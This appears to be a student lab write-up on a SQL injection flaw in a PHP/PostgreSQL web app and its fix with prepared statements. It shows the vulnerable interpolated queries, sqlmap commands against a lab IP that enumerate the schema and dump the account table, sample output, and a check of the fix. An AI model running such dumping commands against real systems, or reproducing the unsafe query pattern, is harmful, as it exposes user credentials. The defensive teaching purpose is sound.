		<h1> # FIX OWASP 2013 A1: SQL Injection, use prepared statements </h1>
		<h2> The Vulnerability </h2>
		<ul>
			<li> Brief explanation:
<xmp>
	The sqlinjection vulnerability arises when unsanitized input is unknowingly run by the database. 
	Malicious input data from the user dynamically constructs an SQL query allowing them to execute
	their own commands. 
</xmp>
			</li>
			<li> Example code etc.:
<xmp>
	# From index.php
	<?	
		...
		$query= "SELECT id, username, firstName, lastName, passwd FROM account WHERE username='$user' AND passwd='$password'";
		$result = pg_prepare($dbconn, "", $query);
		$result = pg_execute($dbconn, "", array());
		...
		$result = pg_prepare($dbconn, "", "DELETE FROM solution WHERE id=$expressionId AND accountId=$accountId");
		$result = pg_execute($dbconn, "", array());
		...
		$result = pg_prepare($dbconn, "", "SELECT * FROM solution WHERE expression='$expression'");
		$result = pg_execute($dbconn, "", array());
		...
			$result = pg_prepare($dbconn, "", "insert into solution (value, expression, accountId) values ($value, '$expression', $accountId)");
			$result = pg_execute($dbconn, "", array());
		...	
	?>

</xmp>
			</li>
			<li> How attacker exploits this: 

<xmp>
	# Attacker can exploit the sqlinjection by using sqlmap which will assess the injectability and extract the wanted data.
	# The attacker can use this command which targets the login inputs:

		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST --dbs

	# To which the output would be:
		...
		[21:53:19] [INFO] the back-end DBMS is PostgreSQL
		back-end DBMS: PostgreSQL
		[21:53:19] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
		[21:53:19] [INFO] fetching database (schema) names
		[21:53:19] [WARNING] reflective value(s) found and filtering out
		available databases [3]:
		[*] information_schema
		[*] pg_catalog
		[*] public
		...

	# This not only means that the input is injectable, but also that sqlmap figured out that the backend uses PostgreSQL and found databases
	# Attacker can then run:

		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public --tables
	
	# With the following output:

		...
		[21:59:31] [INFO] retrieved: 'fourfoursuser'
		[21:59:31] [INFO] retrieved: 'solution'
		[21:59:31] [INFO] retrieved: 'account'
		Database: public
		[3 tables]
		+---------------+
		| account       |
		| fourfoursuser |
		| solution      |
		+---------------+
		...

	# Attacker has now found the table names and can dig deeper into the account table for example:

		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public -T account --columns
	
	# With the following output:

		Database: public
		Table: account
		[5 columns]
		+-----------+---------+
		| Column    | Type    |
		+-----------+---------+
		| id        | int4    |
		| firstname | varchar |
		| lastname  | varchar |
		| passwd    | varchar |
		| username  | varchar |
		+-----------+---------+
	
	# The attacker has found a table that contains sensitive data, they can now get usernames and passwords with this command:

		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public -T account --dump

	# With output:

	# This can all be done from the login screen without authentication
	# The attacker can now log in with any account and make any change to the website as they please on behalf of other users. 
	# (deleting entries, adding new expressions etc.)
	# Attacker can use any other field such as expressionID, operation etc. to perform other sql injections
	# For instance these commands would produce the same results
	
		sqlmap -u http://192.168.10.100/fourFours/index.php --data "operation=deleteExpression&expressionId=2&accountId=10" --dbs
		sqlmap -u http://192.168.10.100/fourFours/index.php --data "operation=addExpression&accountId=10&value=3&expression=hi" --method POST -D public -T account --dump



</xmp>
			</li>
			<li> Impact: CIAaa and some details
<xmp>
	This is a breach of confidentiality (C), as SQL databases hold important data for the users, in this case usernames and passwords. Attackers 
	will be able to access information that was meant to be private as demonstrated above.
	SQL injections can also breach authentication (A) as they could allow hackers to log in as other users.
	This can also have consequences on integrity (I). SQL injections can not only allow the attacker to read but also modify data (including deletion).

</xmp>
			</li>
		</ul>

		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
<xmp>
	On the Kali Linux VM, open a terminal and run this sqlmap command:

			kali@kali:~$ sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST --dbs
	
	If the vulnerability is not there, sqlmap would output something similar to this:

			...
			[18:47:11] [CRITICAL] all tested parameters do not appear to be injectable. ...
			...
	
	But in our case, after running the command, sqlmap prompts us:

			...
			it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
	
	To whch we can say 'Y' as we already knew the backend DBSMS is in 'PostgreSQL':

			...
			it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
			for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
	
	To which we say 'Y':

			...
			for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
			...
			POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
	
	sqlmap has found 'user' to be vulnerable, we check for others with 'y':

			...
			POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
			...
			POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
	
	sqlmap has found 'pasword' to be vulnerable, we can just say 'N' now as we have all the confirmation we need:

			...
			POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
			...
			there were multiple injection points, please select the one to use for following injections:
			[0] place: POST, parameter: user, type: Single quoted string (default)
			[1] place: POST, parameter: password, type: Single quoted string
			[q] Quit
	
	We can now choose a parameter to inject, let's use password by inputting 1 and we get the follwoing output:

			...
			available databases [3]:
			[*] information_schema
			[*] pg_catalog
			[*] public
			...
	
	The vulnerability is now verified to be there as sqlmap was able to get information about the databases

                <h2> The Fix </h2>
                <ul>
                        <li> Explain the fix:
<xmp>
	#########################
	# Use prepared statements
	#########################
	
	This is secure because the queries are prepared in advance, the database knows what data type to
   	expect. We are using a template for the code and analyzing the code and user input separately.
	This means that inputs that looks like SQL code will not be confused for actual executable code.
	  

	# From index_fixed.php
	<?	
		...
		$query= "SELECT id, username, firstName, lastName, passwd FROM account WHERE username=$1 AND passwd=$2";
		$result = pg_prepare($dbconn, "statement1", $query);
		$result = pg_execute($dbconn, "statement1", array($user, $password));
		...
		$result = pg_prepare($dbconn, "statement2", 'DELETE FROM solution WHERE id=$1 AND accountId=$2;');
		$result = pg_execute($dbconn, "statement2", array($expressionId, $accountId));
		...
		$result = pg_prepare($dbconn, "statement3", 'SELECT * FROM solution WHERE expression=$1;');
		$result = pg_execute($dbconn, "statement3", array($expression));
		...
			$result = pg_prepare($dbconn, "statement4", 'insert into solution (value, expression, accountId) values ($1, $2, $3);');
			$result = pg_execute($dbconn, "statement4", array($value, $expression, $accountId));

</xmp>
                        </li>
                        <li> How the fix resolves the issue:
<xmp>

	Attack scenario:

		Attacker does not have an account and wants to get in using SQL injections. 
		They run:

			sqlmap -u http://192.168.10.100/fourFours/index_fixed.php --data "user=hi&password=hi&operation=login" --method POST --dbs
		
		But sqlmap says:

			...
			[09:38:34] [WARNING] POST parameter 'operation' does not seem to be injectable
			[09:38:34] [CRITICAL] all tested parameters do not appear to be injectable. ...
			...
		
		The prepared statements worked and prevented the attack.

		The attacker tries other parameters such as:

			sqlmap -u http://192.168.10.100/fourFours/index_fixed.php --data "operation=deleteExpression&expressionId=2&accountId=10" --dbs
		
		But gets:

			...
			[09:53:41] [WARNING] POST parameter 'accountId' does not seem to be injectable
			[09:53:41] [CRITICAL] all tested parameters do not appear to be injectable. ...
			...
		
		SQL injection attacks have been prevented.
